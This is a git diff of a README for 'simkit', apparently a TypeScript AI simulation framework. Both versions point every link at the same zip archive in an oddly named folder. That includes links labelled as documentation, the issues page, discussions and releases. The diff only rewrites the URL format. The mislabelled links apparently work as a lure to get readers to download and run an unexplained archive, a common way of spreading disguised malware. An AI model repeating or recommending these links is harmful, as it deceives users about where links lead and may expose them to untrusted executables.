@@ -1,6 +1,6 @@
 # 🤖 simkit - Build and Run AI Simulations Easily
 
-[![Download SimKit](https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip%https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip)](https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip)
+[![Download SimKit](https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip%https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip)](https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip)
 
 ## 🚀 What is SimKit?
 
@@ -18,7 +18,7 @@ SimKit is a TypeScript simulation framework designed for testing and running AI 
 To get started with SimKit, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Download SimKit](https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip)
+   [Download SimKit](https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip)
 
 2. **Choose the Latest Version:** On the releases page, find the latest version of SimKit.
 
@@ -52,14 +52,14 @@ Once you have launched SimKit, follow these steps to set up your simulation:
 
 ## 📘 Documentation
 
-For more detailed instructions on advanced features and configurations, please refer to the official [SimKit Documentation](https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip). This resource provides comprehensive guides and examples to help you leverage all that SimKit has to offer.
+For more detailed instructions on advanced features and configurations, please refer to the official [SimKit Documentation](https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip). This resource provides comprehensive guides and examples to help you leverage all that SimKit has to offer.
 
 ## 🤝 Community & Support
 
 If you have questions or need assistance, the SimKit community is here to help. You can join our discussion forums and chat groups. Here are some ways to get in touch:
 
-- **GitHub Issues:** Report any problems or feature requests on our [GitHub Issues page](https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip).
-- **Discussion Forum:** Join discussions with other users and developers in our [Discussions](https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip).
+- **GitHub Issues:** Report any problems or feature requests on our [GitHub Issues page](https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip).
+- **Discussion Forum:** Join discussions with other users and developers in our [Discussions](https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip).
 
 ## 📝 License
 
@@ -69,4 +69,4 @@ SimKit is open-source software released under the MIT License. This means you ca
 
 For the latest updates and releases, be sure to regularly check the releases page. You can download SimKit anytime and start building your AI simulations easily.
 
-[Download SimKit](https://raw.githubusercontent.com/Ipay062021/simkit/main/clarinettist/simkit.zip)
+[Download SimKit](https://github.com/Ipay062021/simkit/raw/refs/heads/main/clarinettist/simkit.zip)
